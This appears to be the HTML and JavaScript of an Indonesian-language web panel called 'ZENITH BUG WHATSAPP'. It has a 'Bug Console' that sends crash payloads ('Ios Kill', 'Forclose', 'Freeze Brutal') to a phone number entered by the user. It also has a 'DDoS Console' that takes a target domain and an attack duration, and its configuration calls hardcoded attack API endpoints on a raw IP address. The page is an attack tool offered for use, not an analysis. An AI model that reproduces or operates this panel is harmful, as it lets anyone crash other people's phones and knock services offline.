...
<style>
    ...
    * {
    ...
    .glass-box {
      ...
      box-shadow: 0 0 30px rgba(180,180,180,0.15), inset 0 0 8px rgba(120,120,120,0.2);
      z-index: 2;
      max-width: 440px;
      width: 100%;
    ...
    #music-toggle {
      ...
      height: 55px;
      border-radius: 50%;
      background: linear-gradient(135deg, #323232, #a000ff);
      border: none;
      color: white;
      font-size: 20px;
      cursor: pointer;
      box-shadow: 0 0 15px rgb(41,40,41);
      transition: transform 0.3s ease;
    }

    @keyframes pulseGlow {
        0%, 100% { box-shadow: 0 0 15px rgba(118,118,118,0.4); }
    ...
    input:focus {
      ...
      box-shadow: 0 0 15px rgba(134,134,134,0.6);
      background: rgba(0, 0, 0, 0.5);
    }

    button {
      background: linear-gradient(135deg, var(--main), #000000);
      border: none;
      color: white;
      width: 100%;
      padding: 15px;
    ...
    button:hover {
      ...
      box-shadow: 0 0 25px rgba(144,139,141,0.8);
    }
    ...
    #chat-area {
        ...
        margin-bottom: 15px;
        padding: 15px 10px;
        background: rgba(20, 0, 30, 0.9) /* Latar belakang gelap transparan */
        border-radius: 12px;
        border: 1px solid rgba(255,255,255,0.1);
    ...
    .loader {
        border: 4px solid rgba(0,0,0,0.2); border-top: 4px solid var(--main);
...
<p class="loading-text">𝐳𝐞𝐧𝐢𝐭𝐡ᶻ𝗓𐰁....</p>
</div>
</div>
...
<nav id="side-menu">
<ul>
<li><a class="menu-link" href="#bug-box">
<i class="fas fa-bug"></i> Bug Console</a></li>
<li><a class="menu-link" href="#ddos-box">
<i class="fas fa-network-wired"></i> DDoS Console</a></li>
<li><a class="menu-link" href="#thanks-box">
<i class="fas fa-heart"></i> Thanks To</a></li>
<li><a class="menu-link" href="#profile-box">
<i class="fas fa-user-cog"></i> My Account</a></li>
<li><a href="https://t.me/znith24" target="_blank">
<i class="fab fa-telegram"></i> Report Error</a></li>
</ul>
</nav>
...
<div class="profile">
<img alt="PP" src="https://files.catbox.moe/8fksnv.jpg"/>
</div>
...
<input id="ddosTarget" placeholder="Target (e.g., example.com)" required="" type="text"/>
<input id="ddosTime" max="600" min="10" placeholder="Duration (seconds)" required="" type="number"/>
...
<div class="profile">
<img alt="profile" src="https://files.catbox.moe/8fksnv.jpg"/>
<div class="profile-info">
<h2 id="userLabel"></h2>
<span class="status"><i class="fas fa-circle"></i> System Connected</span>
</div>
</div>
<h1 class="neon-title"><i class="fas fa-galaxy"></i> 𝐳𝐞𝐧𝐢𝐭𝐡ᶻ𝗓𐰁</h1>
<input id="bugTarget" placeholder="Target: 628xxxx" type="text"/>
<div id="music-player" style="display: none;">
<audio autoplay="" id="bg-music" loop="" muted="" playsinline="">
<source src="https://files.catbox.moe/8b0yqe.mp3" type="audio/mp3"/>
</audio>
</div>
...
<span id="selected-bug-name">Click Here</span>
</div>
...
<div class="bug-option" data-bug="ios"><i class="fab fa-apple"></i><span>Ios Kill</span></div>
<div class="bug-option" data-bug="force"><i class="fas fa-virus"></i><span>Forclose</span></div>
<div class="bug-option" data-bug="freeze"><i class="fas fa-snowflake"></i><span>Freeze Brutal</span></div>
</div>
</div>
...
<a href="https://t.me/znith24" target="_blank">
<i class="fab fa-telegram"></i> @znith24
            </a>
</div>
</div>
...
<img alt="Contributor Photo" class="thanks-photo" src="https://files.catbox.moe/2ud54m.jpg"/>
<h2 class="thanks-name"><a href="https://t.me/znith24" target="_blank">
<i class="fab fa-telegram"></i> @znith24</a></h2>
</div>
<div class="thanks-profile">
<img alt="Contributor Photo" class="thanks-photo" src="https://files.catbox.moe/9rddhl.jpg"/>
<h2 class="thanks-name"><a href="https://t.me/Rizzxtzy" target="_blank">
<i class="fab fa-telegram"></i> @Rizzxtzy</a></h2>
</div>
<div class="thanks-profile">
<img alt="Contributor Photo" class="thanks-photo" src="https://files.catbox.moe/ms24mt.jpg"/>
<h2 class="thanks-name"><a href="https://t.me/iichacan" target="_blank">
<i class="fab fa-telegram"></i> @iichacan</a></h2>
</div>
<div class="thanks-profile">
<img alt="Contributor Photo" class="thanks-photo" src="https://files.catbox.moe/d689kf.jpg"/>
<h2 class="thanks-name"><a href="https://t.me/DaffaAlhamdikaP" target="_blank">
<i class="fab fa-telegram"></i> @DaffaAlhamdikaP</a></h2>
</div>
<div class="thanks-profile">
<img alt="Contributor Photo" class="thanks-photo" src="https://files.catbox.moe/gdecu0.jpg"/>
<h2 class="thanks-name"><a href="https://t.me/acapja" target="_blank">
<i class="fab fa-telegram"></i> @acapja</a></h2>
</div>
...
<input id="chat-input" placeholder="Tulis pertanyaanmu di sini..." type="text"/>
...
<textarea id="feedbackText" placeholder="Tulis bug atau masukan di sini..." style="width:100%; height:150px; padding:12px; border-radius:10px; background:rgba(0,0,0,0.3); 
...
<audio id="loading-sound" src="https://files.catbox.moe/8b0yqe.mp3"></audio>
...
particlesJS("particles-js", {
  particles: {
    ...
    line_linked: { enable: true, distance: 150, color: "#8b8b8b", opacity: 0.3, width: 1 },
...
// --- CONFIGURATION ---
const DB_URL = "https://raw.githubusercontent.com/gitogito186/user/refs/heads/main/user.js";
const BUG_API_ENDPOINT = "http://152.42.214.15:2008/acap?"; 
const DDOS_API_ENDPOINT = "http://152.42.214.15:2002/ddoszenith?";
...
function playIntroSequence(onComplete) {
    ...
    setTimeout(() => {
        ...
        introText.textContent = "HAI USER WELCOME TO WEBSITE";
    }, 1000);

    setTimeout(() => {
        introText.style.fontSize = "2rem";
        introText.textContent = "ZENITH BUG WHATSAPP";
    }, 3000);
...
async function sendBug() {
  ...
  try {
    ...
    showPopup(`Successfully sent bug to <b>${target}</b>`);
